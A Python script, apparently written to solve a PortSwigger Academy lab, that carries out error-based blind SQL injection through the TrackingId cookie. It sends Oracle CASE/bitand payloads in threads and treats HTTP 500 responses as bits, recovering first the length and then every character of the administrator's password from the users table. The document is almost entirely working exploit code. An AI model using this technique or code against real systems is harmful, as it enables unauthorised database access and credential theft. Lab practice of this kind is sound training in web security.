#!/usr/bin/python3

from pwn import *
import requests
import string
import threading
import signal
import time
import pdb
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry


def sigint_handler(signal, frame):
    print("\n\n[*] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sigint_handler)

if (len(sys.argv) != 2):
    log.failure("Use: %s <url>" % sys.argv[0])
    sys.exit(1)

url = sys.argv[1]
bits = [1,2,4,8,16,32,64,128]

def makeRequest(s, url, injection, bits_array, bit):
    s.cookies.set('TrackingId', None)
    s.cookies.set('TrackingId', injection)
    r = s.get(url)
    if (r.status_code == 500):
        bits_array.append((bit,'1'))
    else:
        bits_array.append((bit,'0'))

# Function to convert binary to decimal
def binaryToDecimal(n):
    num = n
 
    # Stores the decimal value
    dec_value = 0
 
    # Initializing base value to 1
    base = 1
 
    le = len(num)
    for i in range(le - 1, -1, -1):
 
        # If the current bit is 1
        if (num[i] == '1'):
            dec_value += base
        base = base * 2
 
    # Return answer
    return dec_value
 
# Function to convert binary to ASCII
def setStringtoASCII(str):
 
    # To store size of s
    N = int(len(str))
 
    # If given string is not a
    # valid string
    if (N % 8 != 0):
        return "Not Possible!"
 
        # To store final answer
    res = ""
 
    # Loop to iterate through string
    for i in range(0, N, 8):
        decimal_value = binaryToDecimal(str[i: i + 8])
 
        # Apprend the ASCII character
        # equivalent to current value
        res += chr(decimal_value)
 
        # Return Answer
    return res

def getbit(t):
    return t[1]

def build_binaryStr(bits_array):
    bits_sorted_by_position = sorted(bits_array, key=lambda tup: tup[0], reverse=True)
    bits_string = ''.join(list(map(getbit,bits_sorted_by_position)))
    return bits_string

def buildLength(bits_array):
    return int(build_binaryStr(bits_array), 2)    

def checkLength(p1, s, column_name, table_name, conditional_key, conditional_value, url):
    p1.status("Dump length password")
    cookies_init = s.cookies.get_dict()
    trackingIdCookie = cookies_init['TrackingId']
    bits_array = []
    threads = []
    for bit in bits:
        payload = "' || (SELECT CASE WHEN bitand(LENGTH(%s),%d)=%d THEN TO_CHAR(1/0) ELSE '' END FROM %s where %s = %s) || ' -- -" %(column_name, bit, bit, table_name, conditional_key, conditional_value)  
        injection = trackingIdCookie + payload
        thread = threading.Thread(target=makeRequest, args=(s, url, injection, bits_array, bit))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
    
    return buildLength(bits_array)


def dumpPassword(p1, p2, s, column_name, table_name, conditional_key, conditional_value, url, length_password):
    p1.status("Dump password with dump %s" %length_password)
    cookies_init = s.cookies.get_dict()
    trackingIdCookie = cookies_init['TrackingId']
    password = ''
    for position in range(1,length_password+1):
        p1.status("Dump position %d" %position)
        threads = []
        bits_array = []
        for bit in bits:
            payload = "' || (SELECT CASE WHEN bitand(ascii(substr(%s,%d,1)),%d)=%d THEN TO_CHAR(1/0) ELSE '' END FROM %s where %s = %s) || ' -- -" %(column_name, position,bit, bit, table_name, conditional_key, conditional_value)  
            injection = trackingIdCookie + payload
            thread = threading.Thread(target=makeRequest, args=(s, url, injection, bits_array, bit))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join() 

        character = setStringtoASCII(build_binaryStr(bits_array))
        password += character
        p2.status(password)
    return password
    
def main():
    print("\n\nScript resolutivo del lab SQLi blind base error de portswigger academy. La injeccciones hace el data extration con la tecnica bitwise, usando threads.")
    print("Happy Hacking!\n\n")
    p1 = log.progress("Brute force")
    p2 = log.progress("Password")
    p1.status("Initialize")
    time.sleep(2)
    s = requests.Session()
    retry = Retry(connect=3, backoff_factor=0.5)
    adapter = HTTPAdapter(max_retries=retry)
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    request_inicial = s.get(url)
    cookies_init = s.cookies.get_dict()
    trackingIdCookie = cookies_init['TrackingId']
    length_password = checkLength(p1, s, 'password','users','username','\'administrator\'',url)
    pasword = dumpPassword(p1, p2, s, 'password','users','username','\'administrator\'',url, length_password)
    print(pasword)

if __name__ == "__main__":
    main()
